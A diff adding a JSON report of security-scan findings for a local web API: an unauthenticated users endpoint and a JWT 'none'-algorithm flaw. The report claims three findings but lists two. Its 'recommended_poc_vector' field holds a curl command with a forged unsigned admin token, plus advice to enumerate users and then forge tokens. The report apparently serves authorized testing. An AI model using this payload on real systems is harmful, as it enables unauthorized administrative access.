@@ -1,0 +1,27 @@
+{
+  "total_findings": 3,
+  "critical": [
+    {
+      "type": "Unauthenticated Access",
+      "severity": "CRITICAL",
+      "description": "Endpoint http://localhost:3000/api/v1/users accessible without authentication",
+      "endpoint": "http://localhost:3000/api/v1/users",
+      "evidence": "HTTP 200 response received"
+    },
+    {
+      "type": "JWT None Algorithm Vulnerability",
+      "severity": "CRITICAL",
+      "description": "JWT accepts \"none\" algorithm - allows token forgery",
+      "algorithm": "none",
+      "evidence": "Token signature verification can be bypassed by setting alg=none",
+      "payload_keys": [
+        "sub",
+        "role",
+        "exp"
+      ]
+    }
+  ],
+  "high": [],
+  "auth_bypass_feasible": true,
+  "recommended_poc_vector": "curl -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJhZG1pbiIsICJleHAiOiA5OTk5OTk5OTk5fQ.' http://localhost:3000/api/v1/admin # HTTP 404 - Token accepted but access denied (may need further refinement) | Alternative: Access http://localhost:3000/api/v1/users to enumerate users then forge JWT"
+}
